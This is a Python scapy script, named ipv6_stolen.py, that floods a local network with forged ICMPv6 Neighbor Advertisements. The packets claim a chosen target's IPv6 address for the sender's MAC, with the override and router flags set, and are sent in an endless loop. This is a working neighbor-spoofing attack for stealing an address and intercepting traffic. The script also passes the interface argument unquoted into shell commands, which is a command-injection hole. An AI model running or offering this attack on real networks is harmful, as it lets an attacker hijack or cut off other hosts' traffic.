#! /usr/bin/python

from scapy.all import *
import os 
import sys
import time
import commands
import getopt 




def main(argv):

    uplink = ""
    target = ""
    
    try:
        opts, args = getopt.getopt(argv, "hu:t:", ["help", "uplink=", "target="])
    except getopt.GetoptError:
        print('Error: ./ipv6_stolen.py -u <uplink dev> -t <target ipv6 address>')
        print('   or: ./ipv6_stolen.py --uplink=<uplinl dev> --target=<target ipv6 address>')
        sys.exit(2)


    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(' ./ipv6_stolen.py -u <uplink dev> -t <target ipv6 address>')
            print('or: ./ipv6_stolen.py --uplink=<uplinl dev> --target=<target ipv6 address>')
            sys.exit()
        elif opt in ("-u", "--uplink"):
            uplink = arg
        elif opt in ("-t", "--target"):
            target = arg
    print('uplink dev: ', uplink)
    print('target: ', target)


    test1 = "grep 'link/ether' | awk '{print $2}'"
    mac_addr = commands.getoutput('ip add show dev %s | %s' % (uplink,test1))
    print mac_addr
    
    test2 = "grep 'inet6 fe80' | awk '{print $2}' | awk -F '/' '{print $1}'" 
    linklocal_addr = commands.getoutput('ip add show dev %s | %s' % (uplink,test2))
    print linklocal_addr
    
    a=IPv6(src=linklocal_addr, dst='FF02::1')
    b=ICMPv6ND_NA(R=1, S=0, O=1, res=0, tgt=target)
    c=ICMPv6NDOptSrcLLAddr(type=2, lladdr=mac_addr)
    
    
    while 1 : 
        sendp(Ether()/a/b/c, inter=0.2, count=5)
        time.sleep(3)


if __name__ == "__main__":
    main(sys.argv[1:])



